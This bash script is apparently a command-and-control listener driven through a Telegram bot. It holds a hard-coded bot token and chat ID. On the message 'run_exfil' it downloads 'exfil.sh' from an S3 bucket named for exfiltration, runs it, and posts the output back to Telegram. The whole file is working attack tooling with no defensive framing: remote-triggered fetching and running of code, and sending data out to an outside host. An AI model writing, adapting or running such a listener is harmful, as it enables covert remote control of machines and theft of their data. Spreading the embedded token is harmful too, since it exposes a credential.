#!/bin/bash

# === CONFIGURATION ===
BOT_TOKEN="7984683506:AAGMhKzxbDqBh3MeXQks88HEIkrVboXuPps"
CHAT_ID="7031538964"
LAST_UPDATE_ID_FILE=".last_update_id"

# === INITIALIZATION ===
if [ -f "$LAST_UPDATE_ID_FILE" ]; then
    LAST_UPDATE_ID=$(cat "$LAST_UPDATE_ID_FILE")
else
    LAST_UPDATE_ID=0
fi

# === FUNCTION TO SEND MESSAGE TO TELEGRAM ===
send_message() {
    local msg="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$msg" > /dev/null
}

# === MAIN LOOP ===
echo "[*] Telegram Listener Started..."
send_message "🤖 Listener started and ready for commands!"

while true; do
    # Poll Telegram for new messages
    updates=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID + 1))&timeout=10")
    
    count=$(echo "$updates" | jq '.result | length')

    if [[ "$count" -gt 0 ]]; then
        for (( i=0; i<count; i++ )); do
            update_id=$(echo "$updates" | jq ".result[$i].update_id")
            message_text=$(echo "$updates" | jq -r ".result[$i].message.text // empty")

            # Update last processed update_id
            echo "$update_id" > "$LAST_UPDATE_ID_FILE"
            LAST_UPDATE_ID=$update_id

            echo "[+] New Command Received: $message_text"

            case "$message_text" in
                "run_exfil")
                    echo "[*] Executing run_exfil process..."
                    send_message "📥 Fetching 'exfil.sh' from S3..."

                    # Download from S3 (assuming AWS CLI is configured)
                    aws s3 cp s3://sisabasexfiltrationbucket/exfil.sh ./exfil.sh &> /dev/null

                    if [[ -f "exfil.sh" ]]; then
                        chmod +x exfil.sh
                        send_message "⚙️ Running exfil.sh..."
                        echo "[*] Executing exfil.sh..."
                        output=$(./exfil.sh 2>&1)

                        send_message "📤 Output:\n$output"
                        echo "[*] Output sent to Telegram."
                    else
                        send_message "❌ Failed to download exfil.sh from S3."
                        echo "[!] exfil.sh not found after download."
                    fi
                    ;;
                *)
                    echo "[!] Ignored: '$message_text' is not a valid trigger."
                    ;;
            esac
        done
    fi

    sleep 3
done